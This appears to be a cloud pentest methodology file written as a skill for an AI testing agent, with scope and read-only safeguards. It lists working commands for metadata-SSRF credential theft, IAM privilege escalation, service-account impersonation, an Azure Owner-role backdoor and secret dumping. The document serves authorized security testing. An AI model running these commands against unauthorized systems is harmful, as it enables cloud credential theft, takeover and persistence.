# Moraa — Cloud Pentest Methodology (AWS / Azure / GCP / Aliyun / Tencent / Huawei)

> Load when you have cloud creds (from SSRF/metadata, a leaked key, a repo, or client-provided),
> or when the target *is* cloud infra. Methodology adapted from **cain-agent**
> (github.com/cdxiaodong/cain-agent, Apache-2.0) — its `skills/` has 80 per-service deep-dive
> files (aws-lambda-privesc, gcp-iam-privesc, azure-keyvault, s3, eks, etc.); pull the specific
> one when you're deep in a service.
>
> **Safety (matches THE ONE RULE):** default **read-only** — enumerate & prove, don't create/
> delete/exfil-at-scale. Confirm every asset is in `scope.yaml`/auth.json scope first. Redact
> secrets before they touch `findings/`. Validate a finding in a second pass before reporting.

---

## The 8 stages

```
1 recon → 2 auth/cred config → 3 resource enum → 4 metadata SSRF → 5 IAM privesc
   → 6 data access (prove, don't hoard) → 7 persistence* → 8 log posture*
        (*persistence/log-tamper: describe the capability; do NOT execute on a live client)
```

## 0. First move with ANY credential — identify it, don't burn it

```bash
# AWS  (works read-only, low-noise)
aws sts get-caller-identity                 # who am I / account id / arn
aws iam get-account-authorization-details   # if allowed → full policy graph
# Azure
az login --service-principal -u <app> -p <secret> --tenant <t>;  az account show
# GCP
gcloud auth activate-service-account --key-file=key.json; gcloud config list; gcloud auth list
# Aliyun / Tencent / Huawei
aliyun sts GetCallerIdentity   |   tccli sts GetCallerIdentity   |   (Huawei: IAM token → /v3/auth
```
> A leaked `AKIA…`/`ASIA…` (AWS), `AIza…` (GCP API key), service-account JSON, `LTAI…` (Aliyun),
> or connection string is the crown jewel. **First prove identity & permissions, then map blast
> radius.** ASIA = temp creds (need session token; usually from metadata).

## 1. Recon (external, pre-cred)

```bash
# storage buckets from name permutations (anonymous exposure = instant win)
# AWS S3: https://<bucket>.s3.amazonaws.com/  |  cloud_enum -k <company> ; s3scanner ; grayhatwarfare
cloud_enum -k target -k target-prod -k target-dev
# passive: certs, JS bundles (mine for keys — see framework-misconfig.md §3), git repos, dorks
# anonymous bucket read across providers
aws s3 ls s3://<bucket> --no-sign-request
gsutil ls gs://<bucket>            curl https://storage.googleapis.com/<bucket>
curl https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list
curl https://<bucket>.oss-<region>.aliyuncs.com/            # Aliyun OSS
curl https://<bucket>.cos.<region>.myqcloud.com/            # Tencent COS
curl https://<bucket>.obs.<region>.myhuaweicloud.com/       # Huawei OBS
```

### Cloudflare R2 — `.r2.dev` public-bucket exposure
R2 buckets are private by default; making one public means either a custom domain or Cloudflare's
managed `https://<bucket>.r2.dev` dev-preview subdomain. The dev-preview switch is meant for
testing and routinely gets left on in production.
```bash
# dorks
site:.r2.dev "<company>"                      # public dev-preview buckets
site:.r2.cloudflarestorage.com "<company>"    # the private S3-compatible endpoint (names leak here)
# mine your own proxy history / JS bundles for bucket names
grep -roiE '[a-z0-9._-]+\.r2\.(dev|cloudflarestorage\.com)' ./js/ | sort -u
```
The oracle — request the bucket root and read the error:
```bash
curl -s https://<bucket>.r2.dev/
#  404 "Object not found"                               → r2.dev IS enabled (public)
#  401 "You are not authorized to view this bucket"     → r2.dev disabled (hardened)
```
There is no bucket-wide listing on `r2.dev`, so enumeration is by object name: try `invoice`,
`receipt`, `backup`, `.env`, `config.json`, `dump.sql`, `users.csv`, and any object keys you found
in JS or API responses. Adjacent checks on any app that fronts R2: missing ownership check on the
download route (classic IDOR on the object key → `idor-access-control.md`), unrestricted upload /
filename collision letting you overwrite another tenant's object, SVG upload served inline (stored
XSS → `xss.md`), and a CORS policy on the bucket that allowlists third-party domains (`cors.md`).
**Impact gate:** a 404 on the root proves only that the preview is on — the finding is a retrieved
object containing someone else's PII/credentials/financial data. Cloudflare's own program has paid
on `r2.dev` subdomain takeover (H1 #1700276), so a dangling `r2.dev` CNAME belongs in
`subdomain-takeover.md`'s workflow too.
Reference: https://www.intigriti.com/researchers/blog/hacking-tools/hacking-misconfigured-cloudflare-r2-buckets-a-complete-guide
Reference: https://bugology.intigriti.io/misconfig-mapper-docs/services/cloudflare-r2/r2-dev-enabled
Reference: https://hackerone.com/reports/1700276

## 2. Metadata SSRF (turns an app SSRF into cloud creds)

Full payloads + header caveats + bypasses are in **`ssrf.md` §1-2**. Provider metadata IPs:

| Platform | Endpoint / note |
|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` |
| AWS ECS | `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` (headerless — best) |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (hdr `Metadata:true`) |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` (hdr `Metadata-Flavor:Google`) |
| Aliyun | `http://100.100.100.200/latest/meta-data/` |
| Tencent | `http://metadata.tencentyun.com/latest/meta-data/` |
| Huawei | `http://169.254.169.254/openstack/latest/meta_data.json` |

Grab role creds → export → `aws sts get-caller-identity` to confirm, then §3/§5.

## 3. Resource & permission enumeration (automate, then read the graph)

```bash
# AWS — best tools
enumerate-iam.py --access-key … --secret-key …          # brute your own effective perms
prowler aws                                              # 300+ checks, misconfigs
cloudfox aws --profile p all                             # attack-path oriented ("what can I do")
ScoutSuite aws / azure / gcp / aliyun                    # multi-cloud posture HTML report
pacu                                                     # AWS exploitation framework (privesc modules)
# Azure
az role assignment list --all;  AzureHound / ROADrecon (Entra ID)
# GCP
gcloud projects get-iam-policy PROJECT;  gcloud asset search-all-iam-policies
```
Enumerate storage, compute, functions, secrets, DBs, queues per provider (S3/EC2/Lambda/Secrets/
RDS/SNS/SQS · Blob/Functions/KeyVault · GCS/GCE/CloudFunctions/BigQuery/Secret Manager · OSS/RAM).

## 4. IAM / RAM / CAM privilege escalation (the payout)

**AWS shadow-admin vectors — if you hold any of these, you're admin:**
```
iam:CreateAccessKey (on another user)     → make keys for an admin
iam:AttachUserPolicy / AttachRolePolicy   → attach AdministratorAccess to self
iam:PutUserPolicy / PutRolePolicy         → inline allow *:*
iam:CreatePolicyVersion --set-as-default  → rewrite a policy you're attached to
iam:PassRole + (lambda:CreateFunction|ec2:RunInstances|glue|cloudformation|datapipeline)
                                          → pass an admin role to compute you control → run as it
iam:UpdateAssumeRolePolicy                → let yourself assume a privileged role
lambda:UpdateFunctionCode                 → inject code into a function that runs as a priv role
sts:AssumeRole (over-broad trust)         → hop to a better role
```
> Pacu `iam__privesc_scan` and CloudFox map these automatically.
> **AWS deep-dive** (fuller shadow-admin table, Lambda/EKS/ECS/Cognito/API-Gateway/SNS/SQS
> per-service attack surface, IMDSv2 bypass nuances, persistence) → **`cloud-aws.md`**.

### GCP IAM/SA privesc — beyond the basics
`getAccessToken`/`actAs`/`setIamPolicy`/`iam.serviceAccountKeys.create`/deploy-function-as-SA are
the common path. Also check for:
```bash
# implicitDelegation — SA1 (you) impersonates SA3 THROUGH SA2 without SA1→SA3 direct rights
curl -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA:generateAccessToken" \
  -d '{"delegates":["projects/-/serviceAccounts/DELEGATED_SA"],"scope":["https://www.googleapis.com/auth/cloud-platform"]}'
# signBlob / signJwt — forge a signed JWT AS the target SA (e.g. for GCS-signed-URL or OIDC audiences)
gcloud iam service-accounts sign-jwt --iam-account=TARGET_SA payload.json out.jwt
# getOpenIdToken — mint an OIDC token for the SA, useful for external federation targets
gcloud auth print-identity-token --impersonate-service-account=TARGET_SA
```
**GCE**: instance metadata + startup-script abuse, disk-snapshot theft (snapshot another
project's disk if perms allow, then mount/read offline), **IAP tunnel** as a pivot even when the
instance has no public IP (`gcloud compute start-iap-tunnel INSTANCE 22 --zone=Z`).
**GCS**: HMAC-key issuance for S3-interop creds, object-version read (deleted-but-not-purged
data), bucket-policy backdoor. **BigQuery**: query-history mining for embedded creds/PII, UDF
(user-defined function) abuse for code execution inside a query job, dataset-level IAM privesc.
**Cloud Functions**: unauth invoke, env-var secret dump, malicious redeploy if you hold
`cloudfunctions.functions.update`. **Pub/Sub**: push-subscription SSRF (a push endpoint you
control receives POSTed messages FROM Google's infra — but also: if you can set a topic's push
endpoint, you can redirect messages meant for an internal consumer), dead-letter-queue mining.

### Azure — beyond Key Vault/metadata
```bash
# App Registration backdoor — durable persistence/privesc via a new credential on an existing app
az ad app credential reset --id $APPID --append --query password -o tsv
az role assignment create --assignee $APPID --role "Owner" --scope /
```
**Functions**: storage-account connection-string leak (the function's own storage account is
often broader than the function itself), Kudu/SCM endpoint (`https://APP.scm.azurewebsites.net`)
= arbitrary deploy/console if reachable, Managed-Identity token theft via
`http://169.254.169.254/metadata/identity/oauth2/token` (hdr `Metadata:true`), Application
Settings injection (env vars visible to anyone with Reader on the app). **Key Vault**:
access-policy vs RBAC-mode confusion (check which model is active before assuming a denial is
final), **soft-delete** means "deleted" secrets are still recoverable for their retention window
if you hold `purge`/`recover` rights — don't treat a delete as evidence destroyed, network-rule
bypass via "trusted Azure services" exceptions.

### Aliyun / Tencent / Huawei — same shape as AWS/GCP, provider-specific service names
| Provider | IAM equiv | Compute | Object storage | Container | Serverless |
|---|---|---|---|---|---|
| Aliyun | RAM (policy attach/create-version privesc, same pattern as AWS IAM) | ECS | OSS | ACK | Function Compute (FC) |
| Tencent | CAM | CVM | COS | TKE | SCF |
| Huawei | IAM | ECS | OBS | CCE | FunctionGraph |

Per-provider top techniques (same 10-method shape as AWS in `cloud-aws.md`, condensed): RAM/CAM/
IAM policy self-escalation (attach-policy / create-policy-version, mirrors the AWS shadow-admin
table), security-group over-permissive-rule enumeration, RDS/TencentDB/RDS-equivalent direct
access if security group allows, load-balancer (SLB/CLB/ELB) backend-pool enumeration to find
unlisted internal services, container-service (ACK/TKE/CCE) same privesc shape as EKS (privileged
pod → node → cloud IAM via the platform's IRSA-equivalent), log-service abuse (SLS/CLS/LTS — often
contains secrets in application logs), KMS-equivalent key abuse. Use `aliyun`/`tccli`/Huawei CLI
`sts GetCallerIdentity` first (see §0) to confirm identity before any of the above.

### CDN / edge compute
- **CloudFront origin hijack**: if the origin's real IP leaks (see `bypass-4xx.md`'s origin-
  discovery section), requests bypassing the CDN also bypass any WAF/edge rules attached to it.
- **Lambda@Edge / CloudFront Functions / Cloudflare Workers**: these run attacker-adjacent code
  at the edge — if you can modify or inject into one (compromised deploy pipeline, exposed
  Workers API token), that's edge-scoped RCE affecting every request through that distribution.
- **Cloudflare Workers KV**: a Workers-backed app's KV namespace is a data store worth
  enumerating for secrets/session data if you have API-token access to the account.
- **Zero Trust / Access bypass**: check whether the origin is *also* reachable directly
  (unprotected sibling host, direct origin IP) — the CDN-fronted access policy means nothing if
  the backend has no independent auth.

### Vault (HashiCorp) — often the actual secrets root
```bash
curl http://vault:8200/v1/sys/health                              # unauth reachability + version
curl -H "X-Vault-Token: $T" http://vault:8200/v1/secret/metadata -X LIST   # KV v2 list
curl -H "X-Vault-Token: $T" http://vault:8200/v1/secret/data/<path>        # read
curl -H "X-Vault-Token: $T" http://vault:8200/v1/aws/creds/<role>          # dynamic AWS creds — short-lived but live
```
Check for a default/root token left active, an unauthenticated `sys/health`/`sys/seal-status`
leak (confirms the target before you spend time on it), and the **Transit** secrets engine
(`v1/transit/encrypt|decrypt/<key>`) — if you can call it, you decrypt anything encrypted under
that key without ever seeing the key material itself.

## 5. Data access & secrets (prove impact minimally)

```bash
aws secretsmanager list-secrets ; aws secretsmanager get-secret-value --secret-id <x>
aws ssm get-parameters-by-path --path / --with-decryption
az keyvault secret list --vault-name V ; az keyvault secret show …
gcloud secrets versions access latest --secret=S
# storage: prove read with ONE object listing / a small file, not a full sync of a live client
aws s3 ls s3://bucket ; aws s3 cp s3://bucket/<one-file> - | head
```
Snapshots/AMIs, RDS, DynamoDB scans, EBS = data at rest. **Take the minimum that proves it.**

## 6. Post-exploit → chain / report

```
cloud creds → sts get-caller-identity → privesc → assume admin → (prove) → findings/
metadata SSRF → role creds → S3 secrets / RDS → app data → ATO / full compromise
CI/CD creds (github-actions/gitlab/jenkins/circleci/terraform) → OIDC-to-cloud → prod
```
Report: severity + confidence + evidence chain + remediation (matches `reporting.md`). Persistence
and log-tampering: **describe the capability and impact; do not execute** against a client estate.

## Deep-dive files
AWS specifically → **`cloud-aws.md`** (distilled from cain-agent's ~20 AWS files). Kubernetes/
Docker escape → **`k8s.md`**. CI/CD platform creds (GitHub Actions/GitLab/Jenkins/CircleCI/
Terraform state) → **`cicd-attack.md`**. GCP/Azure/Aliyun/Tencent/Huawei/CDN/Vault sections above
are already the distillation — for anything not covered there, cain-agent's raw source
(github.com/cdxiaodong/cain-agent, Apache-2.0) `skills/` has one file per service if you need
more than this level of detail: `gcp-{iam-privesc,storage,compute-engine,cloudfunctions,bigquery,
pubsub}-attack.md` · `azure-{keyvault,functions,attack}.md` · `aliyun/tencent/huawei-attack.md` ·
`{docker,terraform,vault,cdn,cloudflare}-attack.md` · databases: `redis,mongodb,postgresql,
elasticsearch,kafka,cassandra,sqlserver,rabbitmq-attack.md` · CI/CD: `github-actions,gitlab,
jenkins,circleci,concourse,sonarqube,harbor,jira-attack.md`.
